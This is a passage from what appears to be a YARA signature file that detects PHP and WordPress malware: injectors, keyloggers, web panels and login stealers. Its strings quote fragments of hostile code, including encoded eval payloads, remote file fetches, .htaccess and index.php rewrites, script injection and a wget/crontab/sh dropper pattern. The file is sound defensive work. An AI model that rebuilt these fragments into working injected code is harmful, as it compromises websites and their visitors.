        $trigger = "$hhg = file_get_contents(\"http://"
    condition:
        $trigger
}

rule php_malware_injector_033 : malware
{
    strings:
        $trigger = "icaiji_"
    condition:
        $trigger and PR02092
}

private rule PR04957 : trigger
{
    strings:
        $ps0 = "<?php @include(\"\\x"
    condition:
        $ps0
}

rule php_malware_injector_034 : malware
{
    strings:
        $trigger = "\\x2e\\x6a\\x70\\x67\");"
    condition:
        $trigger and PR04957
}

private rule PR04958 : trigger
{
    strings:
        $ps0 = "if ((strcheck($useragent, 'Trident')"
    condition:
        $ps0
}

rule php_malware_injector_035 : malware
{
    strings:
        $trigger = "echo '<iframe src=\"' . $"
    condition:
        $trigger and PR04958
}

private rule PR04959 : trigger
{
    strings:
        $ps0 = "if(isset($_GET[\"lian\"]))"
    condition:
        $ps0
}

rule php_malware_injector_036 : malware
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR04959 and PR02492
}

private rule PR04960 : trigger
{
    strings:
        $ps0 = "' . $x0b . '?' . $pars . 'ua=' . '&ip=' . $bip . '&srv=' . base64_encode($_SERVER['SERVER_NAME']);"
    condition:
        $ps0
}

rule php_malware_injector_037 : malware
{
    strings:
        $trigger = "preg_match(\"/Location"
    condition:
        $trigger and PR00342 and PR04960
}

private rule PR04961 : trigger
{
    strings:
        $ps0 = "$url = \"http:"
    condition:
        $ps0
}

private rule PR04962 : trigger
{
    strings:
        $ps0 = "echo $content"
    condition:
        $ps0
}

rule php_malware_injector_038 : malware
{
    strings:
        $trigger = "$contents = file_get_contents($url);"
    condition:
        $trigger and PR04961 and PR04962
}

rule php_malware_injector_039 : malware
{
    strings:
        $trigger = "require_once(plugin_dir_path(__FILE__) . \"readme.txt\");"
    condition:
        $trigger
}

private rule PR04963 : trigger
{
    strings:
        $ps0 = "if((get_gate_data())||(get_gate_data())||"
    condition:
        $ps0
}

private rule PR04964 : trigger
{
    strings:
        $ps0 = "<div style=\"visibility: hidden !important;\">"
    condition:
        $ps0
}

rule php_malware_injector_040 : malware
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR04963 and PR04964
}

private rule PR04965 : trigger
{
    strings:
        $ps0 = "echo \"<div style="
    condition:
        $ps0
}

rule php_malware_injector_040_02 : malware
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR04963 and PR04965
}

private rule PR04966 : trigger
{
    strings:
        $ps0 = "m=\\\"\\\"; for (i=0; i<s.length; i++) m+=String.fromCharCode"
    condition:
        $ps0
}

rule php_malware_injector_040_03 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR04966 and PR00029
}

private rule PR04967 : trigger
{
    strings:
        $ps0 = "FileWrite($randPath.\"/\".$fileName, base64_decode($fileData), $fileMode, $filePrefix)"
    condition:
        $ps0
}

rule php_malware_injector_041 : malware
{
    strings:
        $trigger = "get_writable_dirs(\".\");"
    condition:
        $trigger and PR04967 and PR00203
}

rule php_malware_injector_042 : malware
{
    strings:
        $trigger = "is_admin()) ) {echo"
    condition:
        $trigger and PR00050
}

private rule PR04968 : trigger
{
    strings:
        $ps0 = "function getDirContents($dir)"
    condition:
        $ps0
}

private rule PR04969 : trigger
{
    strings:
        $ps0 = "vhosts"
    condition:
        $ps0
}

rule php_malware_injector_043 : malware
{
    strings:
        $trigger = "$pos1"
    condition:
        $trigger and PR00435 and PR04968 and PR04969
}

private rule PR04970 : trigger
{
    strings:
        $ps0 = "<param name=\"allowscriptaccess\" value=\"always\"></param><param name=\"menu\" value=\"false\"></param>"
    condition:
        $ps0
}

rule php_malware_injector_044 : malware
{
    strings:
        $trigger = "add_action('wp_footer"
    condition:
        $trigger and PR04970
}

// MANUAL FIX NECESSARY
private rule PR04971 : trigger
{
    strings:
        $ps0 = "if(file_exists($filename) && is_writable($filename)) {"
    condition:
        $ps0
}

rule php_malware_injector_045 : malware
{
    strings:
        $trigger = "file_get_contents"
        $php_malware_injector_045_r0 = /\$file\s*=\s*str_replace\(\$\w+\[\d\],\s*\$pattern_php,\s*\$file\)/
    condition:
        $trigger and PR00355 and PR04971 and PR00357 and $php_malware_injector_045_r0
}

private rule PR04972 : trigger
{
    strings:
        $ps0 = "$xi = xp(xg(xu()));"
    condition:
        $ps0
}

rule php_malware_injector_046 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04972 and PR00357
}

rule php_malware_injector_047 : malware
{
    strings:
        $trigger = "aW5pX3NldCgnZXJyb3JfbG9nJywgJy9kZXYvbnVsbCcpO3BhcnNlX3"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_malware_injector_048 : malware
{
    strings:
        $trigger = "if ((is_dir(\"wp-content/themes/$dir\")) AND ($dir !== \".\") AND ($dir !== \"..\"))"
    condition:
        $trigger and PR00203
}

private rule PR04973 : trigger
{
    strings:
        $ps0 = "chmod($file_index, 0777);"
    condition:
        $ps0
}

rule php_malware_injector_049 : malware
{
    strings:
        $trigger = "$start.\"Sinst Included"
    condition:
        $trigger and PR00435 and PR04973
}

rule php_malware_injector_050 : malware
{
    strings:
        $trigger = "@file_put_contents($path.\"/../wp-includes/load.php\", $load, FILE_APPEND)"
    condition:
        $trigger
}

private rule PR04974 : trigger
{
    strings:
        $ps0 = "function get_data"
    condition:
        $ps0
}

rule php_malware_injector_051 : malware
{
    strings:
        $trigger = "get_data('http"
    condition:
        $trigger and PR00435 and PR04974
}

private rule PR04975 : trigger
{
    strings:
        $ps0 = "|userAgent|"
    condition:
        $ps0
}

private rule PR04976 : trigger
{
    strings:
        $ps0 = "echo \"<noindex><script id="
    condition:
        $ps0
}

rule php_malware_injector_052 : malware
{
    strings:
        $trigger = "return c.toString("
    condition:
        $trigger and PR04975 and PR04976 and PR00604
}

rule php_malware_injector_053 : malware
{
    strings:
        $trigger = "metaphone($l = $l.$license["
    condition:
        $trigger and PR00732
}

private rule PR04977 : trigger
{
    strings:
        $ps0 = "){echo'WP_Error_Page_Not_Found '.\" </br>"
    condition:
        $ps0
}

rule php_malware_injector_054 : malware
{
    strings:
        $trigger = "file_get_contents('https://gist.githubusercontent"
    condition:
        $trigger and PR00435 and PR04977
}

private rule PR04978 : trigger
{
    strings:
        $ps0 = "echo '<script>window.location.replace(\"'.$"
    condition:
        $ps0
}

rule php_malware_injector_055 : malware
{
    strings:
        $trigger = "md5(microtime()"
    condition:
        $trigger and PR04978
}

private rule PR04979 : trigger
{
    strings:
        $ps0 = "| xargs grep -rl \"<head\""
    condition:
        $ps0
}

rule php_malware_injector_056 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02027 and PR04979 and PR01468
}

private rule PR04980 : trigger
{
    strings:
        $ps0 = "<script>if (!!window.chrome && !!window.chrome.webstore){function"
    condition:
        $ps0
}

rule php_malware_injector_057 : malware
{
    strings:
        $trigger = "(){document.getElementById('popup-container').style.display='block';document.getElementById('"
    condition:
        $trigger and PR04411 and PR04980
}

private rule PR04981 : trigger
{
    strings:
        $ps0 = "0777 & fileperms($"
    condition:
        $ps0
}

rule php_malware_injector_058 : malware
{
    strings:
        $trigger = "= '# \\* @category \\s*Mage#';"
    condition:
        $trigger and PR04981 and PR01431
}

rule php_malware_injector_059 : malware
{
    strings:
        $trigger = "),base64_decode(\\'PD9waHAgQGZp"
    condition:
        $trigger and PR03867
}

private rule PR04982 : trigger
{
    strings:
        $ps0 = "@search_file($_SERVER['DOCUMENT_ROOT'].$dop,$file_to_search);"
    condition:
        $ps0
}

rule php_malware_injector_060 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04982 and PR01431
}

private rule PR04983 : trigger
{
    strings:
        $ps0 = "if(!empty($_GET[\"del\"])) @unlink($"
    condition:
        $ps0
}

private rule PR04984 : trigger
{
    strings:
        $ps0 = ",\"<CODE>\",0);if($"
    condition:
        $ps0
}

rule php_malware_injector_061 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04983 and PR04984 and PR00357
}

private rule PR04985 : trigger
{
    strings:
        $ps0 = "echo\"im okey\";exit;elseif(isset($_GET["
    condition:
        $ps0
}

rule php_malware_injector_062 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04985 and PR00357
}

private rule PR04986 : trigger
{
    strings:
        $ps0 = "$handle = popen('/bin/ping'.$sendmail, 'r');"
    condition:
        $ps0
}

rule php_malware_injector_063 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR04986
}

private rule PR04987 : trigger
{
    strings:
        $ps0 = "]});}}}@ob_start();@register_shutdown_function("
    condition:
        $ps0
}

rule php_malware_injector_064 : malware
{
    strings:
        $trigger = "}!==false&&preg_match(\""
    condition:
        $trigger and PR04987
}

rule php_malware_injector_065 : malware
{
    strings:
        $trigger = "@json_decode(@file_get_contents(content_file), true);"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_injector_066 : malware
{
    strings:
        $trigger = "file_get_contents"
        $php_malware_injector_066_r0 = /\$[\w]+[\s]*=[\s]*strpos\(\$[\w]+[\s]*,[\s]*\$[\w]+\);[\s]*if[\s]*\(\$[\w]+[\s]*===[\s]*false\)[\s]*\{[\s]*unlink\(.[\S]+.\);[\s]*\$[\w]+[\s]*=[\s]*file_get_contents/
    condition:
        $trigger and PR01468 and PR01469 and $php_malware_injector_066_r0
}

// MANUAL FIX NECESSARY
rule php_malware_injector_067 : malware
{
    strings:
        $trigger = "if(str"
        $php_malware_injector_067_r0 = /class [\w]+[\s]*\{[\s]*function __construct\(\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*\$this->[\w]+\(\$this->[\w]+\);[\s]*\$[\w]+[\s]*=[\s]*\$this[\s]*->[\w]+\(\$this->[\w]+\(\$[\w]+\)\);[\s]*\$[\w]+[\s]*=[\s]*\$this->[\w]+\(\$[\w]+\);[^\}]+\$[\w]+\[[\d]+\]\);[\s]*\}[^\x02]+var \$[\w]+[\s]*=[\s]*['\"][^;]{200,}['\"];[\s]*\}[\s]*new [\w]+\(\);[\s]*/
    condition:
        $trigger and PR01698 and $php_malware_injector_067_r0
}

private rule PR04988 : trigger
{
    strings:
        $ps0 = "PElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+DQpSZXdyaXRlRW5naW5"
    condition:
        $ps0
}

private rule PR04989 : trigger
{
    strings:
        $ps0 = "@set_time_limit(0);error_reporting(0);"
    condition:
        $ps0
}

rule php_malware_injector_068 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR04988 and PR04989
}

// MANUAL FIX NECESSARY
rule php_malware_injector_069 : malware
{
    strings:
        $trigger = "Mage_Shell"
        $php_malware_injector_069_r0 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$_POST\[.[\w]+.\][\s]*\)[\s]*\)[\s]*echo[\s]*\$_POST\[.[\w]+.\][\s]*\([\s]*\$_POST\[.[\w]+.\]\);/
    condition:
        $trigger and PR04056 and $php_malware_injector_069_r0
}

private rule PR04990 : trigger
{
    strings:
        $ps0 = "file_put_contents($file->getPathname()"
    condition:
        $ps0
}

private rule PR04991 : trigger
{
    strings:
        $ps0 = "new RecursiveIteratorIterator(new RecursiveDirectoryIterator($"
    condition:
        $ps0
}

rule php_malware_injector_071 : malware
{
    strings:
        $trigger = "if (!isset($_REQUEST["
    condition:
        $trigger and PR04990 and PR04991
}

rule php_malware_injector_072 : malware
{
    strings:
        $trigger = "|| !file_exists($"
    condition:
        $trigger and PR01468 and PR02221 and PR01431
}

// MANUAL FIX NECESSARY
rule php_malware_injector_074 : malware
{
    strings:
        $trigger = "file_put_contents($_SERVER[\"DOCUMENT_ROOT\"]."
        $php_malware_injector_074_r0 = /file_put_contents\(\$_SERVER\[.DOCUMENT_ROOT.\]\...wp-[\w]+[^,]+,[\s]*base64_decode\(.[^\)]{1000,}\)+;/
    condition:
        $trigger and $php_malware_injector_074_r0
}

rule php_malware_injector_074_02 : malware
{
    strings:
        $trigger = "file_put_contents($_SERVER[\"DOCUMENT_ROOT\"].base64_decode($"
    condition:
        $trigger
}

private rule PR04992 : trigger
{
    strings:
        $ps0 = "wp_remote_retrieve_body(wp_remote_get("
    condition:
        $ps0
}

private rule PR04993 : trigger
{
    strings:
        $ps0 = "PHP_INT_MAX"
    condition:
        $ps0
}

rule php_malware_injector_075 : malware
{
    strings:
        $trigger = "add_action('wp_footer"
    condition:
        $trigger and PR04992 and PR04993
}

private rule PR04994 : trigger
{
    strings:
        $ps0 = "if (preg_match(\"/google/i\", $hostIp) || preg_match(\"/google/i\", $hostRealIp)){"
    condition:
        $ps0
}

rule php_malware_injector_076 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR04994 and PR03964
}

private rule PR04995 : trigger
{
    strings:
        $ps0 = ")])AND empty($_COOKIE["
    condition:
        $ps0
}

rule php_malware_injector_077 : malware
{
    strings:
        $trigger = ")])AND!$GLOBALS["
    condition:
        $trigger and PR04995
}

rule php_malware_injector_078 : malware
{
    strings:
        $trigger = "PHNjcmlwdCBzcmM9Imh0dHBzOi8v"
    condition:
        $trigger and PR01398
}

private rule PR04996 : trigger
{
    strings:
        $ps0 = "preg_replace(\"\\57\\x3c\\41\\x2d\\55"
    condition:
        $ps0
}

rule php_malware_injector_079 : malware
{
    strings:
        $trigger = "file_put_contents($_SERVER[\"\\x44\\x4f\\x43\\x55\\x4d\\x45\\116\\124\\137\\x52\\x4f\\117\\124\"]"
    condition:
        $trigger and PR04996 and PR00341 and PR00342
}

private rule PR04997 : trigger
{
    strings:
        $ps0 = "tidioelements.com"
    condition:
        $ps0
}

rule php_malware_injector_080 : malware
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR04997
}

private rule PR04998 : trigger
{
    strings:
        $ps0 = "pack(\"H*\", '"
    condition:
        $ps0
}

rule php_malware_injector_081 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01780 and PR04998 and PR01468
}

private rule PR04999 : trigger
{
    strings:
        $ps0 = ");})(document.createElement('script'),'http"
    condition:
        $ps0
}

private rule PR05000 : trigger
{
    strings:
        $ps0 = "setAttribute('data-zone',"
    condition:
        $ps0
}

private rule PR05001 : trigger
{
    strings:
        $ps0 = ",document.body||document.documentElement)</script><script src='https:"
    condition:
        $ps0
}

rule php_malware_injector_082 : malware
{
    strings:
        $trigger = "usleep("
    condition:
        $trigger and PR04999 and PR02092 and PR05000 and PR05001
}

// MANUAL FIX NECESSARY
rule php_malware_injector_083 : malware
{
    strings:
        $trigger = "('',"
        $php_malware_injector_083_r0 = /\$\w+.=.\\"\/\w+\([^=]*=.\w+\(\$\w+\[\d+\],.\$\w+\[\d+\],.''\);[^\}]*\}'.\..\$\w+.\..'\/\/'\)\);/
    condition:
        $trigger and $php_malware_injector_083_r0
}

rule php_malware_injector_084 : malware
{
    strings:
        $trigger = "echo @file_get_contents('index.html.bak"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR05002 : trigger
{
    strings:
        $ps0 = "PD9waHAKaWYoaXNzZXQoJF9HRVRbInNleHgiXSkmJiRfR0VUWyJzZXh4Il09PSJzZWMiKXsgZWNobydBcGFjaGUgSGVjJzsgfQ"
    condition:
        $ps0
}

rule php_malware_injector_085 : malware
{
    strings:
        $trigger = "$_POST"
        $php_malware_injector_085_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR05002 and PR00397 and $php_malware_injector_085_r0
}

rule php_malware_injector_087 : malware
{
    strings:
        $trigger = "base64_decode(file_get_contents("
    condition:
        $trigger and PR04532 and PR02152
}

private rule PR05003 : trigger
{
    strings:
        $ps0 = "$_COOKIE') == false) {"
    condition:
        $ps0
}

rule php_malware_injector_088 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR05003 and PR01899
}

private rule PR05004 : trigger
{
    strings:
        $ps0 = "add_filter( 'pre_option_blogname', '"
    condition:
        $ps0
}

rule php_malware_injector_089 : malware
{
    strings:
        $trigger = "add_action('init"
    condition:
        $trigger and PR05004
}

private rule PR05005 : trigger
{
    strings:
        $ps0 = "touch(dirname($htaccess_path)"
    condition:
        $ps0
}

rule php_malware_injector_090 : malware
{
    strings:
        $trigger = "return $output;"
    condition:
        $trigger and PR05005 and PR00203
}

private rule PR05006 : trigger
{
    strings:
        $ps0 = "%3Cscript%3E%3B%28function"
    condition:
        $ps0
}

private rule PR05007 : trigger
{
    strings:
        $ps0 = "xmlrpc.php|wp-includes"
    condition:
        $ps0
}

rule php_malware_injector_092 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR05006 and PR05007
}

private rule PR05008 : trigger
{
    strings:
        $ps0 = "str_replace('</head>', '<script type"
    condition:
        $ps0
}

private rule PR05009 : trigger
{
    strings:
        $ps0 = "strrpos($path,'public_html"
    condition:
        $ps0
}

rule php_malware_injector_093 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR05008 and PR05009 and PR00357
}

// MANUAL FIX NECESSARY
private rule PR05010 : trigger
{
    strings:
        $ps0 = "RewriteRule ^$"
    condition:
        $ps0
}

rule php_malware_injector_095 : malware
{
    strings:
        $trigger = "GLOB_ONLYDIR);"
        $php_malware_injector_095_r0 = /if[\s]*\(strstr\(\$[\w]+,[\s]*.RewriteRule/
    condition:
        $trigger and PR05010 and PR00355 and PR00357 and PR01431 and $php_malware_injector_095_r0
}

private rule PR05011 : trigger
{
    strings:
        $ps0 = "preg_replace(\"|(<body"
    condition:
        $ps0
}

rule php_malware_injector_096 : malware
{
    strings:
        $trigger = "file_get_contents(base64_decode($_GET["
    condition:
        $trigger and PR00355 and PR05011 and PR00357
}

private rule PR05012 : trigger
{
    strings:
        $ps0 = "require('wp-content/coment');"
    condition:
        $ps0
}

rule php_malware_injector_097 : malware
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR05012
}

private rule PR05013 : trigger
{
    strings:
        $ps0 = "chmod($path."
    condition:
        $ps0
}

rule php_malware_injector_098 : malware
{
    strings:
        $trigger = "$checkhtaccess = file_get_contents($path.\"/"
    condition:
        $trigger and PR05013
}

private rule PR05014 : trigger
{
    strings:
        $ps0 = "str_replace(\"://\",\"@\",$"
    condition:
        $ps0
}

rule php_malware_injector_099 : malware
{
    strings:
        $trigger = "if($dirname == \"public_html\" || $dirname == \"www\" || $dirname == \"htdocs\") {"
    condition:
        $trigger and PR02027 and PR01468 and PR05014 and PR01021
}

private rule PR05015 : trigger
{
    strings:
        $ps0 = "imagecreate(1,1); imagesetpixel($"
    condition:
        $ps0
}

rule php_malware_injector_100 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR03964 and PR05015
}

private rule PR05016 : trigger
{
    strings:
        $ps0 = "wp_initialize_the_theme_message(); exit();"
    condition:
        $ps0
}

rule php_malware_injector_101 : malware
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR05016 and PR01480
}

private rule PR05017 : trigger
{
    strings:
        $ps0 = "echo \"<b>Script Detected --- 1</b>\\n\";"
    condition:
        $ps0
}

rule php_malware_injector_102 : malware
{
    strings:
        $trigger = "$file_contents = str_replace($searchfor,\"\",$content);"
    condition:
        $trigger and PR05017 and PR01431
}

private rule PR05018 : trigger
{
    strings:
        $ps0 = "$x_domains[array_rand($x_domains)] ."
    condition:
        $ps0
}

private rule PR05019 : trigger
{
    strings:
        $ps0 = "$root"
    condition:
        $ps0
}

rule php_malware_injector_103 : malware
{
    strings:
        $trigger = "file_"
    condition:
        $trigger and PR05018 and PR05019
}

rule php_malware_injector_103_02 : malware
{
    strings:
        $trigger = "<?php unlink(__FILE__); $root =  $_SERVER[\"DOCUMENT_ROOT\"];"
    condition:
        $trigger and PR02208
}

private rule PR05020 : trigger
{
    strings:
        $ps0 = "$data = base64_decode($file_body) . PHP_EOL . substr($indexphp,"
    condition:
        $ps0
}

rule php_malware_injector_103_03 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR02141 and PR05020
}

rule php_malware_injector_105 : malware
{
    strings:
        $trigger = "CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdf"
    condition:
        $trigger and PR00050 and PR01092
}

rule php_malware_injector_106 : malware
{
    strings:
        $trigger = "head.appendChild(s);})(document);"
    condition:
        $trigger and PR00322 and PR00050 and PR01240
}

private rule PR05021 : trigger
{
    strings:
        $ps0 = ":\"aWYoIWNsYXNzX2V4aXN0"
    condition:
        $ps0
}

rule php_malware_injector_107 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR05021
}

rule php_malware_injector_108 : malware
{
    strings:
        $trigger = "echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116)"
    condition:
        $trigger
}

private rule PR05022 : trigger
{
    strings:
        $ps0 = "LUrHEoRTDv0al703GGXtiZxm5rJSzjnz9Qu2p6aAprullvT0"
    condition:
        $ps0
}

rule php_malware_injector_109 : malware
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR05022 and PR00029
}

private rule PR05023 : trigger
{
    strings:
        $ps0 = "JE8wME9PMDAwPSJxT2FSamJ2SHdZbG1ucGRV"
    condition:
        $ps0
}

rule php_malware_injector_110 : malware
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR05023 and PR00029
}

rule php_malware_injector_111 : malware
{
    strings:
        $trigger = "if (gettype($data) == 'array') return array_map(\"trimming\", $data);"
    condition:
        $trigger and PR02034
}

private rule PR05024 : trigger
{
    strings:
        $ps0 = "$content = explode($end, $temp[1], 2);"
    condition:
        $ps0
}

rule php_malware_injector_112 : malware
{
    strings:
        $trigger = "file_put_contents('.htaccess"
    condition:
        $trigger and PR05024
}

// MANUAL FIX NECESSARY
rule php_malware_injector_113 : malware
{
    strings:
        $trigger = "chr(93).chr(41).chr(59).chr(100).chr(111).chr(99).chr(117).chr(109).chr(101).chr(110).chr(116).chr(46).chr(103).chr(101).chr(116).chr(69).chr(108).chr(101).chr(109).chr(101).chr(110).chr(116).chr(115).chr(66).chr(121).chr(84).chr(97).chr(103).chr(78).chr(97).chr(109).chr(101).chr(40).chr(83).chr(116).chr(114).chr(105).chr(110).chr(103).chr(46).chr(102).chr(114).chr(111).chr(109).chr(67).chr(104).chr(97).chr(114).chr(67).chr(111).chr(100).chr(101).chr(40)"
        $php_malware_injector_113_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and $php_malware_injector_113_r0
}

private rule PR05025 : trigger
{
    strings:
        $ps0 = "PHP_EOL . $str, FILE_APPEND);}"
    condition:
        $ps0
}

rule php_malware_injector_114 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01469 and PR05025
}

rule php_malware_injector_115 : malware
{
    strings:
        $trigger = "@file_put_contents($do.\"index.php\","
    condition:
        $trigger and PR00029 and PR01422 and PR01742
}

private rule PR05026 : trigger
{
    strings:
        $ps0 = "file_get_contents(str_rot13(\"uggcf"
    condition:
        $ps0
}

rule php_malware_injector_116 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05026
}

private rule PR05027 : trigger
{
    strings:
        $ps0 = "ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoU3RyaW5nLmZyb21DaGFyQ29kZSg"
    condition:
        $ps0
}

rule php_malware_injector_117 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02027 and PR05027 and PR01468
}

private rule PR05028 : trigger
{
    strings:
        $ps0 = "Nagishly.init"
    condition:
        $ps0
}

private rule PR05029 : trigger
{
    strings:
        $ps0 = "script.src"
    condition:
        $ps0
}

rule php_malware_injector_118 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR05028 and PR05029
}

private rule PR05030 : trigger
{
    strings:
        $ps0 = "urlencode($host . $_SERVER['REQUEST_URI"
    condition:
        $ps0
}

rule php_malware_injector_119 : malware
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR05030 and PR01021 and PR01431
}

private rule PR05031 : trigger
{
    strings:
        $ps0 = "<?php }\\nadd_action("
    condition:
        $ps0
}

private rule PR05032 : trigger
{
    strings:
        $ps0 = "substr(file_get_contents(__FILE__), 0x"
    condition:
        $ps0
}

rule php_malware_injector_120 : malware
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR00355 and PR05031 and PR05032
}

private rule PR05033 : trigger
{
    strings:
        $ps0 = "wget -q -O"
    condition:
        $ps0
}

private rule PR05034 : trigger
{
    strings:
        $ps0 = "crontab"
    condition:
        $ps0
}

rule php_malware_injector_121 : malware
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR05033 and PR05034
}

private rule PR05035 : trigger
{
    strings:
        $ps0 = "PD9waHAKJGVydG5uID0gInk2V2pwN"
    condition:
        $ps0
}

rule php_malware_injector_122 : malware
{
    strings:
        $trigger = "!is_dir("
    condition:
        $trigger and PR00435 and PR05035
}

// MANUAL FIX NECESSARY
private rule PR05036 : trigger
{
    strings:
        $ps0 = "chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(36)"
    condition:
        $ps0
}

private rule PR05037 : trigger
{
    strings:
        $ps0 = "*/eval(chr("
    condition:
        $ps0
}

rule php_malware_injector_123 : malware
{
    strings:
        $trigger = "chr(97).chr(100).chr(100).chr(95).chr(97).chr(99).chr(116).chr(105).chr(111).chr(110).chr(40)"
        $php_malware_injector_123_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR05036 and PR05037 and $php_malware_injector_123_r0
}

// MANUAL FIX NECESSARY
private rule PR05038 : trigger
{
    strings:
        $ps0 = "stripslashes(stripslashes($_POST["
    condition:
        $ps0
}

rule php_malware_injector_125 : malware
{
    strings:
        $trigger = "file_get_contents"
        $php_malware_injector_125_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR05038 and PR00357 and $php_malware_injector_125_r0
}

private rule PR05039 : trigger
{
    strings:
        $ps0 = "PD9waHAgJHsiR1x4NGNPXHg0MkFceDRjXHg1MyJ9WyJceDY5XHg1ZnNceDZkXHg3Nnlc"
    condition:
        $ps0
}

rule php_malware_injector_126 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05039 and PR00355 and PR00357
}

// MANUAL FIX NECESSARY
rule php_malware_injector_127 : malware
{
    strings:
        $trigger = "eva"
        $php_malware_injector_127_r0 = /eval\(.echo base64_encode\(.[^;]+.\);.\);/
    condition:
        $trigger and $php_malware_injector_127_r0
}

private rule PR05040 : trigger
{
    strings:
        $ps0 = "]){echo '';exit;}else{echo"
    condition:
        $ps0
}

rule php_malware_injector_130 : malware
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR05040 and PR01431
}

private rule PR05041 : trigger
{
    strings:
        $ps0 = "window.location.href + window.atob(\\\"JnIyPQ=="
    condition:
        $ps0
}

rule php_malware_injector_131 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05041 and PR02062
}

private rule PR05042 : trigger
{
    strings:
        $ps0 = "<script language=JavaScript src=/"
    condition:
        $ps0
}

rule php_malware_injector_gen_029 : malware
{
    strings:
        $trigger = "&& !($_SESSION[\"__default\"][\"user\"]->id)) {echo \""
    condition:
        $trigger and PR05042
}

private rule PR05043 : trigger
{
    strings:
        $ps0 = "if($_SERVER['QUERY_STRING']!=\"\")"
    condition:
        $ps0
}

private rule PR05044 : trigger
{
    strings:
        $ps0 = "function GetFileContent($url)"
    condition:
        $ps0
}

rule php_malware_injector_gen_032 : malware
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR05043 and PR05044
}

rule php_malware_jquery_min_php_001 : malware
{
    strings:
        $trigger = "echo base64_decode(\"PHNjcmlwdD4=\")."
    condition:
        $trigger
}

rule php_malware_keybase_panel_001 : malware
{
    strings:
        $trigger = "<title>KeyBase Web Panel"
    condition:
        $trigger
}

private rule PR05045 : trigger
{
    strings:
        $ps0 = "function chmnr_klgr_enqueue_script()"
    condition:
        $ps0
}

rule php_malware_keylogger_001 : malware
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR05045
}

rule php_malware_letcaro_x24hr_001 : malware
{
    strings:
        $trigger = "$document->_scripts[gzuncompress(base64_decode('e"
    condition:
        $trigger and PR00050
}

private rule PR05046 : trigger
{
    strings:
        $ps0 = "gzuncompress(base64_decode('eJzT1"
    condition:
        $ps0
}

rule php_malware_letcaro_x24hr_002 : malware
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR05046
}

rule php_malware_lodat_001 : malware
{
    strings:
        $trigger = "/wp-includes/lo.dat"
    condition:
        $trigger and PR01479
}

// MANUAL FIX NECESSARY
private rule PR05047 : trigger
{
    strings:
        $ps0 = "$_SERVER['SERVER_NAME'];"
    condition:
        $ps0
}

rule php_malware_loginstealer_001 : malware
{
    strings:
        $trigger = "mail("
        $php_malware_loginstealer_001_r0 = /\$user->getId\(\)\) \{[\s]*\$[\w]+[\s]*=[^(]+\$_SERVER\[.SERVER_NAME.\];/
    condition:
        $trigger and PR05047 and PR04056 and PR04058 and $php_malware_loginstealer_001_r0
}

private rule PR05048 : trigger
{
    strings:
        $ps0 = "@mail($"
    condition:
        $ps0
}

rule php_malware_loginstealer_002 : malware
{
    strings:
        $trigger = "public function processLogin()"
    condition:
        $trigger and PR05048
}

rule php_malware_loginstealer_003 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('VY9Ra8IwEMff"
    condition:
        $trigger
}

